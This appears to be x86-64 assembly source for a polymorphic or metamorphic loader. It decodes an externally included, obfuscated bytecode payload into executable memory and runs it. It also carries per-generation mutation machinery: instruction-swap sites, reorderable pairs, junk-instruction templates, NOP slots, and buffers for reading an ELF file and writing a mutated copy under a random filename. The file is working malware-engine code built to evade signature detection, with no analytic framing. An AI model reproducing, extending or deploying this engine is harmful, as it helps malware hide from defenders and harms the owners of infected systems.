.intel_syntax noprefix
.globl _start

.section .text

# SINGLE ANCHOR + DELTA TABLE (Phase 1)
.align 8
anchor_magic:
    .quad 0xC001CAFE12345678          # Phase 3 will rotate this per-gen

.align 4
delta_table:
    .long reg_alias_map  - anchor_magic    # idx 0
    .long alias_map      - anchor_magic    # idx 1
    .long custom_payload - anchor_magic    # idx 2
    .long custom_payload_end - anchor_magic  # idx 3
    .long nop_slot_0 - anchor_magic        # idx 4
    .long nop_slot_1 - anchor_magic        # idx 5
    .long nop_slot_2 - anchor_magic        # idx 6
    .long nop_slot_3 - anchor_magic        # idx 7
    .long nop_slot_4 - anchor_magic        # idx 8
    .long nop_slot_5 - anchor_magic        # idx 9
    .long nop_slot_6 - anchor_magic        # idx 10
    .long nop_slot_7 - anchor_magic        # idx 11
    .long nop_slot_8 - anchor_magic        # idx 12
    .long nop_slot_9 - anchor_magic        # idx 13
    .long nop_slot_10 - anchor_magic       # idx 14
    .long nop_slot_11 - anchor_magic       # idx 15
    .long junk_templates - anchor_magic    # idx 16
    .long format_perm_table - anchor_magic # idx 17
    .long format_dispatch_table - anchor_magic # idx 18
    .long swap_site_table - anchor_magic   # idx 19
    .long reorder_pair_table - anchor_magic # idx 20
    .long init_op_table - anchor_magic      # idx 21
delta_table_end:

# REGISTER ALIAS MAP (no preceding magic)
reg_alias_map:
.byte 0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F

# ALIAS MAP (no preceding magic)
alias_map:
alias_mov_reg_imm:       .byte 0x10, 0x11, 0x12
alias_mov_reg_imm64:     .byte 0x13, 0x14, 0x15
alias_syscall:           .byte 0x16, 0x17, 0x18
alias_unused:            .byte 0x19, 0x1A, 0x1B
alias_alu_reg_imm:       .byte 0x1C, 0x1D, 0x1E
alias_jne_rel8:          .byte 0x1F, 0x20, 0x21
alias_lea_rsi_rel:       .byte 0x22, 0x23, 0x24
alias_push_imm32:        .byte 0x25, 0x26, 0x27
alias_lea_rdi_rel:       .byte 0x28, 0x29, 0x2A
alias_data_8:            .byte 0x2B, 0x2C, 0x2D
alias_mov_reg_reg:       .byte 0x2E, 0x2F, 0x30
alias_mov_mem_reg:       .byte 0x31, 0x32, 0x33
alias_mov_reg_mem:       .byte 0x34, 0x35, 0x36
alias_mov_reg_imm8:      .byte 0x37, 0x38, 0x39
alias_inc_reg:           .byte 0x3A, 0x3B, 0x3C
alias_dec_reg:           .byte 0x3D, 0x3E, 0x3F
alias_cmp_reg_imm8:      .byte 0x40, 0x41, 0x42
alias_cmp_reg_reg:       .byte 0x43, 0x44, 0x45
alias_jmp_rel8:          .byte 0x46, 0x47, 0x48
alias_je_rel8:           .byte 0x49, 0x4A, 0x4B
alias_jl_rel8:           .byte 0x4C, 0x4D, 0x4E
alias_jge_rel8:          .byte 0x4F, 0x50, 0x51
alias_jnc_rel8:          .byte 0x52, 0x53, 0x54
alias_push_reg:          .byte 0x55, 0x56, 0x57
alias_pop_reg:           .byte 0x58, 0x59, 0x5A
alias_xor_reg_reg:       .byte 0x5B, 0x5C, 0x5D
alias_rdrand_reg:        .byte 0x5E, 0x5F, 0x60
alias_div_reg:           .byte 0x61, 0x62, 0x63
alias_imul_reg_imm8:     .byte 0x64, 0x65, 0x66
alias_and_reg_imm8:      .byte 0x67, 0x68, 0x69
alias_add_reg_imm8:      .byte 0x6A, 0x6B, 0x6C
alias_sub_reg_reg:       .byte 0x6D, 0x6E, 0x6F
alias_add_reg_reg:       .byte 0x70, 0x71, 0x72
alias_mov_byte_mem_reg:  .byte 0x73, 0x74, 0x75
alias_mov_reg_byte_mem:  .byte 0x76, 0x77, 0x78
alias_lea_reg_rip_rel:   .byte 0x79, 0x7A, 0x7B
alias_jnop:              .byte 0x7C, 0x7D, 0x7E
alias_add_reg_imm32:     .byte 0x7F, 0x80, 0x81
alias_mov_reg_dword_mem: .byte 0x82, 0x83, 0x84
alias_xor_reg_imm8:      .byte 0x85, 0x86, 0x87
alias_map_end:

# THE PAYLOAD (no preceding/trailing magic)
custom_payload:
.include "src_trans/payload.inc"
custom_payload_end:

.macro NOP_SLOT id
    .align 1
nop_slot_\id:
    .fill 32, 1, 0x90
nop_slot_\id\()_end:
.endm

.align 8
junk_templates:
# Size 1
    .byte 1, 0,  0x90, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0    # NOP
    .byte 1, 0,  0xF8, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0    # CLC
    .byte 1, 0,  0xFC, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0    # CLD
# Size 2
    .byte 2, 0,  0x66, 0x90, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 # 2-byte NOP
    .byte 2, 0,  0x89, 0xC0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 # mov eax, eax
    .byte 2, 1,  0x04, 0x00, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 # add al, imm8 (1 random)
# Size 3
    .byte 3, 0,  0x0F, 0x1F, 0x00, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 # 3-byte NOP
    .byte 3, 1,  0x80, 0xC1, 0x00, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 # add cl, imm8 (1 random)
    .byte 3, 1,  0x83, 0xE8, 0x00, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 # sub eax, imm8 (1 random)
# Size 4
    .byte 4, 0,  0x0F, 0x1F, 0x40, 0x00, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 # 4-byte NOP
    .byte 4, 2,  0x66, 0xB8, 0x00, 0x00, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 # mov ax, imm16
# Size 5
    .byte 5, 0,  0x0F, 0x1F, 0x44, 0x00, 0x00, 0, 0, 0, 0, 0, 0, 0, 0, 0 # 5-byte NOP
    .byte 5, 4,  0xB8, 0x00, 0x00, 0x00, 0x00, 0, 0, 0, 0, 0, 0, 0, 0, 0 # mov eax, imm32
# Size 6
    .byte 6, 0,  0x66, 0x0F, 0x1F, 0x44, 0x00, 0x00, 0, 0, 0, 0, 0, 0, 0, 0 # 6-byte NOP
    .byte 6, 4,  0x48, 0x05, 0x00, 0x00, 0x00, 0x00, 0, 0, 0, 0, 0, 0, 0, 0 # add rax, imm32 (4 random)
# Size 7
    .byte 7, 0,  0x0F, 0x1F, 0x80, 0x00, 0x00, 0x00, 0x00, 0, 0, 0, 0, 0, 0, 0 # 7-byte NOP
    .byte 7, 4,  0x48, 0xC7, 0xC0, 0x00, 0x00, 0x00, 0x00, 0, 0, 0, 0, 0, 0, 0 # mov rax, imm32 (sx)
# Size 8
    .byte 8, 0,  0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00, 0, 0, 0, 0, 0, 0 # 8-byte NOP
# Size 9
    .byte 9, 0,  0x66, 0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00, 0, 0, 0, 0, 0 # 9-byte NOP
    .byte 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0

junk_templates_end:
.equ JUNK_TEMPLATES_LEN, junk_templates_end - junk_templates

# Phase 5: Swap site + reorder pair metadata tables
# swap_site_table: 25 entries, 8 bytes each.
#   byte 0: kind (1=K1 XOR<->SUB, 2=K2 MOV-direction, 3=K3 TEST<->OR)
#   byte 1: reserved
#   bytes 2-5: delta = swap_site_N - anchor_magic
#   bytes 6-7: reserved
.align 4
swap_site_table:
    .byte 1, 0
    .long swap_site_0  - anchor_magic
    .word 0
    .byte 1, 0
    .long swap_site_1  - anchor_magic
    .word 0
    .byte 1, 0
    .long swap_site_2  - anchor_magic
    .word 0
    .byte 1, 0
    .long swap_site_3  - anchor_magic
    .word 0
    .byte 1, 0
    .long swap_site_4  - anchor_magic
    .word 0
    .byte 1, 0
    .long swap_site_5  - anchor_magic
    .word 0
    .byte 1, 0
    .long swap_site_6  - anchor_magic
    .word 0
    .byte 1, 0
    .long swap_site_7  - anchor_magic
    .word 0
    .byte 1, 0
    .long swap_site_8  - anchor_magic
    .word 0
    .byte 2, 0
    .long swap_site_9 - anchor_magic
    .word 0
    .byte 2, 0
    .long swap_site_10 - anchor_magic
    .word 0
    .byte 2, 0
    .long swap_site_11 - anchor_magic
    .word 0
    .byte 2, 0
    .long swap_site_12 - anchor_magic
    .word 0
    .byte 2, 0
    .long swap_site_13 - anchor_magic
    .word 0
    .byte 2, 0
    .long swap_site_14 - anchor_magic
    .word 0
    .byte 2, 0
    .long swap_site_15 - anchor_magic
    .word 0
    .byte 2, 0
    .long swap_site_16 - anchor_magic
    .word 0
    .byte 2, 0
    .long swap_site_17 - anchor_magic
    .word 0
    .byte 2, 0
    .long swap_site_25 - anchor_magic
    .word 0
    .byte 2, 0
    .long swap_site_26 - anchor_magic
    .word 0
    .byte 2, 0
    .long swap_site_27 - anchor_magic
    .word 0
    .byte 2, 0
    .long swap_site_28 - anchor_magic
    .word 0
    .byte 2, 0
    .long swap_site_29 - anchor_magic
    .word 0
    .byte 2, 0
    .long swap_site_30 - anchor_magic
    .word 0
    .byte 2, 0
    .long swap_site_31 - anchor_magic
    .word 0
    .byte 2, 0
    .long swap_site_32 - anchor_magic
    .word 0
    .byte 2, 0
    .long swap_site_33 - anchor_magic
    .word 0
    .byte 2, 0
    .long swap_site_34 - anchor_magic
    .word 0
    .byte 2, 0
    .long swap_site_35 - anchor_magic
    .word 0
    .byte 2, 0
    .long swap_site_36 - anchor_magic
    .word 0
    .byte 3, 0
    .long swap_site_18 - anchor_magic
    .word 0
    .byte 3, 0
    .long swap_site_19 - anchor_magic
    .word 0
    .byte 3, 0
    .long swap_site_20 - anchor_magic
    .word 0
    .byte 3, 0
    .long swap_site_21 - anchor_magic
    .word 0
    .byte 3, 0
    .long swap_site_22 - anchor_magic
    .word 0
    .byte 3, 0
    .long swap_site_23 - anchor_magic
    .word 0
    .byte 3, 0
    .long swap_site_24 - anchor_magic
    .word 0
    .byte 3, 0
    .long swap_site_37 - anchor_magic
    .word 0
swap_site_table_end:
.equ N_SWAP_SITES, (swap_site_table_end - swap_site_table) / 8

# reorder_pair_table: 7 entries, 8 bytes each.
#   byte 0: half_size (size of one half = b - a)
#   bytes 1-3: reserved
#   bytes 4-7: delta = reorder_pair_N_a - anchor_magic
.align 4
reorder_pair_table:
    .byte 7, 0, 0, 0
    .long reorder_pair_0_a - anchor_magic
    .byte 5, 0, 0, 0
    .long reorder_pair_1_a - anchor_magic
    .byte 4, 0, 0, 0
    .long reorder_pair_2_a - anchor_magic
    .byte 4, 0, 0, 0
    .long reorder_pair_3_a - anchor_magic
    .byte 3, 0, 0, 0
    .long reorder_pair_4_a - anchor_magic
    .byte 3, 0, 0, 0
    .long reorder_pair_5_a - anchor_magic
    .byte 3, 0, 0, 0
    .long reorder_pair_6_a - anchor_magic
reorder_pair_table_end:
.equ N_REORDER_PAIRS, (reorder_pair_table_end - reorder_pair_table) / 8

# INITIALIZE TRANSLATION TABLE
init_table:
    # Clear 2048 bytes (256 * 8) first
    mov rcx, 256
swap_site_0:
    xor eax, eax
swap_site_9:
    mov rbx, rdi
ClearTableLoop:
    mov qword ptr [rbx], rax
    add rbx, 8
    dec rcx
    jnz ClearTableLoop

    lea rsi, [rip + alias_map]

.macro INIT_OP alias_start, packed_val
    .byte 0x48, 0xB8
    .quad \packed_val
    .byte 0x48, 0x0F, 0xB6, 0x56, (\alias_start - 0x10)
    .byte 0x48, 0x89, 0x04, 0xD7
    .byte 0x48, 0x0F, 0xB6, 0x56, (\alias_start - 0x10 + 1)
    .byte 0x48, 0x89, 0x04, 0xD7
    .byte 0x48, 0x0F, 0xB6, 0x56, (\alias_start - 0x10 + 2)
    .byte 0x48, 0x89, 0x04, 0xD7
.endm

init_op_table:
    # Type | ModBase | OpExt | BaseREX | b2 | b1 | op_len | opc_len
    # Raw Copy:
    INIT_OP 0x13, 0x0400004800B80901 # MOV_REG_IMM64
    INIT_OP 0x16, 0x00000000050F0002 # SYSCALL
    INIT_OP 0x19, 0x0000000000900001 # UNUSED (Fallback to JNOP)
    INIT_OP 0x1F, 0x0000000000750101 # JNE_REL8
    INIT_OP 0x22, 0x000000358D480403 # LEA_RSI_REL
    INIT_OP 0x25, 0x0000000000680401 # PUSH_IMM32
    INIT_OP 0x28, 0x0000003D8D480403 # LEA_RDI_REL
    INIT_OP 0x2B, 0x0000000000000800 # DATA_8
    INIT_OP 0x46, 0x0000000000EB0101 # JMP_REL8
    INIT_OP 0x49, 0x0000000000740101 # JE_REL8
    INIT_OP 0x4C, 0x00000000007C0101 # JL_REL8
    INIT_OP 0x4F, 0x00000000007D0101 # JGE_REL8
    INIT_OP 0x52, 0x0000000000730101 # JNC_REL8
    INIT_OP 0x7C, 0x0000000000900001 # JNOP

    # Type 8: REG_IMM32
    INIT_OP 0x10, 0x08C0004800C70501 # MOV_REG_IMM
    INIT_OP 0x1C, 0x08C0004800810501 # ALU_REG_IMM
    INIT_OP 0x7F, 0x08C0004800810501 # ADD_REG_IMM32

    # Type 1: RM_REG
    INIT_OP 0x2E, 0x01C0004800890201 # MOV_REG_REG
    INIT_OP 0x31, 0x0100004800890201 # MOV_MEM_REG
    INIT_OP 0x5B, 0x01C0004800310201 # XOR_REG_REG
    INIT_OP 0x6D, 0x01C0004800290201 # SUB_REG_REG
    INIT_OP 0x70, 0x01C0004800010201 # ADD_REG_REG
    INIT_OP 0x73, 0x0100004000880201 # MOV_BYTE_MEM_REG (8-bit)

    # Type 2: REG_RM
    INIT_OP 0x34, 0x02000048008B0201 # MOV_REG_MEM
    INIT_OP 0x43, 0x02C00048003B0201 # CMP_REG_REG
    INIT_OP 0x76, 0x02000048B60F0202 # MOV_REG_BYTE_MEM (8-bit)
    INIT_OP 0x82, 0x02000040008B0201 # MOV_REG_DWORD_MEM (32-bit, REX 0x40 no W)

    # Type 3: REG_ONLY_MODRM
    INIT_OP 0x3A, 0x03C0004800FF0101 # INC_REG
    INIT_OP 0x3D, 0x03C0014800FF0101 # DEC_REG
    INIT_OP 0x5E, 0x03C00648C70F0102 # RDRAND_REG
    INIT_OP 0x61, 0x03C0064800F70101 # DIV_REG

    # Type 4: REG_ONLY_OPCODE
    INIT_OP 0x55, 0x0400000000500001 # PUSH_REG
    INIT_OP 0x58, 0x0400000000580001 # POP_REG

    # Type 5: REG_IMM8
    INIT_OP 0x37, 0x05C0004800C70201 # MOV_REG_IMM8
    INIT_OP 0x40, 0x05C0074800830201 # CMP_REG_IMM8
    INIT_OP 0x67, 0x05C0044800830201 # AND_REG_IMM8
    INIT_OP 0x6A, 0x05C0004800830201 # ADD_REG_IMM8
    INIT_OP 0x85, 0x05C0064800830201 # XOR_REG_IMM8

    # Type 6: REG_IMM8_DUAL
    INIT_OP 0x64, 0x06C00048006B0201 # IMUL_REG_IMM8

    # Type 7: REG_RIP_REL
    INIT_OP 0x79, 0x07050048008D0501 # LEA_REG_RIP_REL
    
    ret
NOP_SLOT 0

_start:
    # Memory Map (r14 = base):
    #   +0x0000 (0):     Translation table     - 2048 bytes (256 * 8)
    #   +0x0800 (2048):  [padding]
    #   +0x1000 (4096):  JIT code buffer       - 8192 bytes max
    #   +0x3000 (12288): ELF read buffer       - 32768 bytes max
    #   +0xB000 (45056): Mutated payload buf   - 8192 bytes max
    #   +0xD000 (53248): New alias bytes buf   - 256 bytes
    #   +0xD100 (53504): Random filename buf   - 32 bytes
    #   +0xD200 (53760): Payload scratch vars  - 64 bytes
    #     +0x00: elf_size      (8 bytes, saved after sys_read)
    #     +0x08: payload_start (8 bytes, saved after FOUND_PAYLOAD_START)

    # Allocate Executable/Writable Memory (mmap)
    mov rax, 9          # sys_mmap
swap_site_1:
    xor rdi, rdi        # addr = NULL
reorder_pair_0_a:
    mov rsi, 65536      # length = 64KB (Table, JIT, Builder Buf, ELF Buf)
reorder_pair_0_b:
    mov rdx, 7          # prot = PROT_READ | PROT_WRITE | PROT_EXEC
reorder_pair_0_end:
    mov r10, 0x22       # flags = MAP_PRIVATE | MAP_ANONYMOUS
    mov r8, -1          # fd = -1
swap_site_2:
    xor r9, r9          # offset = 0
    syscall

swap_site_18:
    test rax, rax
    js Error
swap_site_10:
    mov r14, rax        # R14 = translation table base
    lea r15, [r14 + 4096] # R15 = JIT compiled code destination

    # Initialize translation table in our writable mapped memory
swap_site_11:
    mov rdi, r14
    call init_table

    # 2. JIT Translation Loop
    lea r12, [rip + custom_payload]  # Source
    lea r13, [rip + custom_payload_end]
swap_site_12:
    mov r8, r15                      # Save start of JIT buffer for calling later

TranslateLoop:
    cmp r12, r13
    jae TranslateDone

    movzx rax, byte ptr [r12]
    inc r12

swap_site_13:
    mov rbx, r14
    mov rdx, qword ptr [rbx + rax * 8]

swap_site_14:
    mov rcx, rdx
    shr rcx, 56
    cmp rcx, 9
    jae TranslateDone
    
    # Permutation lookup
    lea rax, [rip + format_perm_table]
    movzx rcx, byte ptr [rax + rcx]    # rcx = perm[rcx]
    
    # Self-relative dispatch (PIE-safe per R4.1)
    lea rax, [rip + format_dispatch_table]
    add rax, qword ptr [rax + rcx*8]   # rax = base + (handler - base) = handler
    jmp rax

.align 1
format_perm_table:
    .byte 0, 1, 2, 3, 4, 5, 6, 7, 8

.align 8
format_dispatch_table:
    .quad .format_0 - format_dispatch_table
    .quad .format_1 - format_dispatch_table
    .quad .format_2 - format_dispatch_table
    .quad .format_3 - format_dispatch_table
    .quad .format_4 - format_dispatch_table
    .quad .format_5 - format_dispatch_table
    .quad .format_6 - format_dispatch_table
    .quad .format_7 - format_dispatch_table
    .quad .format_8 - format_dispatch_table

.format_0:
    movzx rcx, dl
    mov al, dh
swap_site_19:
    test rcx, rcx
    jz .f0_copy_ops_prep

    push rdx
    shr rdx, 16
.f0_op_write:
    mov byte ptr [r15], dl
    inc r15
    shr rdx, 8
    dec rcx
    jnz .f0_op_write
    pop rdx

.f0_copy_ops_prep:
    mov cl, al
    test cl, cl
    jz TranslateLoop

.f0_copy_ops:
    mov al, byte ptr [r12]
    mov byte ptr [r15], al
reorder_pair_4_a:
    inc r12
reorder_pair_4_b:
    inc r15
reorder_pair_4_end:
    dec cl
    jnz .f0_copy_ops
    jmp TranslateLoop
NOP_SLOT 4

.format_1:
    movzx r8, byte ptr [r12]
    lea r10, [rip + reg_alias_map]
    movzx r8, byte ptr [r10 + r8]
    movzx r9, byte ptr [r12+1]
    movzx r9, byte ptr [r10 + r9]
    add r12, 2
    call .write_rex_and_op
swap_site_15:
    mov rax, rdx
    shr rax, 48
    and rax, 0xFF
    and r9, 7
    shl r9, 3
    or rax, r9
    and r8, 7
    or rax, r8
    mov byte ptr [r15], al
    inc r15
    jmp TranslateLoop
NOP_SLOT 5

.format_2:
    movzx r9, byte ptr [r12]
    lea r10, [rip + reg_alias_map]
    movzx r9, byte ptr [r10 + r9]
    movzx r8, byte ptr [r12+1]
    movzx r8, byte ptr [r10 + r8]
    add r12, 2
    call .write_rex_and_op
swap_site_16:
    mov rax, rdx
    shr rax, 48
    and rax, 0xFF
    and r9, 7
    shl r9, 3
    or rax, r9
    and r8, 7
    or rax, r8
    mov byte ptr [r15], al
    inc r15
    jmp TranslateLoop
NOP_SLOT 6

.format_3:
    movzx r8, byte ptr [r12]
    lea r10, [rip + reg_alias_map]
    movzx r8, byte ptr [r10 + r8]
swap_site_3:
    xor r9, r9
    add r12, 1
    call .write_rex_and_op
swap_site_25:
    mov rax, rdx
    shr rax, 48
    and rax, 0xFF
swap_site_26:
    mov r11, rdx
    shr r11, 40
    and r11, 0xFF
    shl r11, 3
    or rax, r11
    and r8, 7
    or rax, r8
    mov byte ptr [r15], al
    inc r15
    jmp TranslateLoop
NOP_SLOT 7

.format_4:
    movzx r8, byte ptr [r12]
    lea r10, [rip + reg_alias_map]
    movzx r8, byte ptr [r10 + r8]
swap_site_4:
    xor r9, r9
    add r12, 1
swap_site_27:
    mov r11, r8
    and r11, 7
    shl r11, 16
    add rdx, r11
    call .write_rex_and_op
swap_site_28:
    mov rcx, rdx
    shr rcx, 8
    and rcx, 0xFF
swap_site_20:
    test rcx, rcx
    jz TranslateLoop
    dec rcx                     # subtract the reg byte already consumed by this handler
swap_site_21:
    test rcx, rcx
    jz TranslateLoop
.fmt4_copy_ops:
    mov al, byte ptr [r12]
    mov byte ptr [r15], al
    inc r12
    inc r15
    dec rcx
    jnz .fmt4_copy_ops
    jmp TranslateLoop
NOP_SLOT 8

.format_5:
    movzx r8, byte ptr [r12]
    lea r10, [rip + reg_alias_map]
    movzx r8, byte ptr [r10 + r8]
swap_site_5:
    xor r9, r9
    add r12, 1
    call .write_rex_and_op
swap_site_29:
    mov rax, rdx
    shr rax, 48
    and rax, 0xFF
swap_site_30:
    mov r11, rdx
    shr r11, 40
    and r11, 0xFF
    shl r11, 3
    or rax, r11
    and r8, 7
    or rax, r8
    mov byte ptr [r15], al
    inc r15
    mov al, byte ptr [r12]
    mov byte ptr [r15], al
reorder_pair_5_a:
    inc r12
reorder_pair_5_b:
    inc r15
reorder_pair_5_end:
    # Check if opcode is 0xC7 (MOV_REG_IMM8) to pad remaining 3 bytes of imm32
    mov rax, rdx
    shr rax, 16
    and rax, 0xFF
    cmp al, 0xC7
    jne .f5_done
    mov byte ptr [r15], 0
reorder_pair_1_a:
    mov byte ptr [r15+1], 0
reorder_pair_1_b:
    mov byte ptr [r15+2], 0
reorder_pair_1_end:
    add r15, 3
.f5_done:
    jmp TranslateLoop
NOP_SLOT 9

.format_6:
    movzx r8, byte ptr [r12]
    lea r10, [rip + reg_alias_map]
    movzx r8, byte ptr [r10 + r8]
swap_site_31:
    mov r9, r8
    add r12, 1
    call .write_rex_and_op
swap_site_32:
    mov rax, rdx
    shr rax, 48
    and rax, 0xFF
swap_site_33:
    mov r11, r8
    and r11, 7
    shl r11, 3
    or rax, r11
    and r8, 7
    or rax, r8
    mov byte ptr [r15], al
    inc r15
    mov al, byte ptr [r12]
    mov byte ptr [r15], al
reorder_pair_6_a:
    inc r12
reorder_pair_6_b:
    inc r15
reorder_pair_6_end:
    jmp TranslateLoop
NOP_SLOT 10

.format_7:
    movzx r9, byte ptr [r12]
    lea r10, [rip + reg_alias_map]
    movzx r9, byte ptr [r10 + r9]
swap_site_6:
    xor r8, r8
    add r12, 1
    call .write_rex_and_op
swap_site_34:
    mov rax, rdx
    shr rax, 48
    and rax, 0xFF
    and r9, 7
    shl r9, 3
    or rax, r9
    mov byte ptr [r15], al
    inc r15
    mov eax, dword ptr [r12]
    mov dword ptr [r15], eax
reorder_pair_2_a:
    add r12, 4
reorder_pair_2_b:
    add r15, 4
reorder_pair_2_end:
    jmp TranslateLoop
NOP_SLOT 11

.format_8:
    movzx r8, byte ptr [r12]
    lea r10, [rip + reg_alias_map]
    movzx r8, byte ptr [r10 + r8]
swap_site_7:
    xor r9, r9
    add r12, 1
    call .write_rex_and_op
swap_site_35:
    mov rax, rdx
    shr rax, 48
    and rax, 0xFF
swap_site_36:
    mov r11, rdx
    shr r11, 40
    and r11, 0xFF
    shl r11, 3
    or rax, r11
    and r8, 7
    or rax, r8
    mov byte ptr [r15], al
    inc r15
    mov eax, dword ptr [r12]
    mov dword ptr [r15], eax
reorder_pair_3_a:
    add r12, 4
reorder_pair_3_b:
    add r15, 4
reorder_pair_3_end:
    jmp TranslateLoop

.write_rex_and_op:
swap_site_17:
    mov rax, rdx
    shr rax, 32
    and rax, 0xFF
    cmp r8, 8
    jl .wrex_chk2
swap_site_22:
    test rax, rax
    jnz .has_rex1
    mov rax, 0x40
.has_rex1:
    or rax, 0x01
.wrex_chk2:
    cmp r9, 8
    jl .wrex_out
swap_site_23:
    test rax, rax
    jnz .has_rex2
    mov rax, 0x40
.has_rex2:
    or rax, 0x04
.wrex_out:
swap_site_24:
    test rax, rax
    jz .wop_loop_prep
    mov byte ptr [r15], al
    inc r15
.wop_loop_prep:
    movzx rcx, dl
swap_site_37:
    test rcx, rcx
    jz .wop_done
    push rdx
    shr rdx, 16
.wop_loop:
    mov byte ptr [r15], dl
    inc r15
    shr rdx, 8
    dec rcx
    jnz .wop_loop
    pop rdx
.wop_done:
    ret
NOP_SLOT 1

TranslateDone:
    lea rax, [r14 + 4096]
    call rax           # execute JIT-compiled payload
    mov rax, 60
swap_site_8:
    xor rdi, rdi
    syscall
NOP_SLOT 2

TranslateError:
Error:
    mov rax, 60
    mov rdi, 1
    syscall
NOP_SLOT 3

# Reorder pair size invariant assertions (placed at end so labels are resolved)
.if (reorder_pair_0_b - reorder_pair_0_a) != (reorder_pair_0_end - reorder_pair_0_b)
.error "reorder pair 0 size mismatch"
.endif
.if (reorder_pair_1_b - reorder_pair_1_a) != (reorder_pair_1_end - reorder_pair_1_b)
.error "reorder pair 1 size mismatch"
.endif
.if (reorder_pair_2_b - reorder_pair_2_a) != (reorder_pair_2_end - reorder_pair_2_b)
.error "reorder pair 2 size mismatch"
.endif
.if (reorder_pair_3_b - reorder_pair_3_a) != (reorder_pair_3_end - reorder_pair_3_b)
.error "reorder pair 3 size mismatch"
.endif
.if (reorder_pair_4_b - reorder_pair_4_a) != (reorder_pair_4_end - reorder_pair_4_b)
.error "reorder pair 4 size mismatch"
.endif
.if (reorder_pair_5_b - reorder_pair_5_a) != (reorder_pair_5_end - reorder_pair_5_b)
.error "reorder pair 5 size mismatch"
.endif
.if (reorder_pair_6_b - reorder_pair_6_a) != (reorder_pair_6_end - reorder_pair_6_b)
.error "reorder pair 6 size mismatch"
.endif
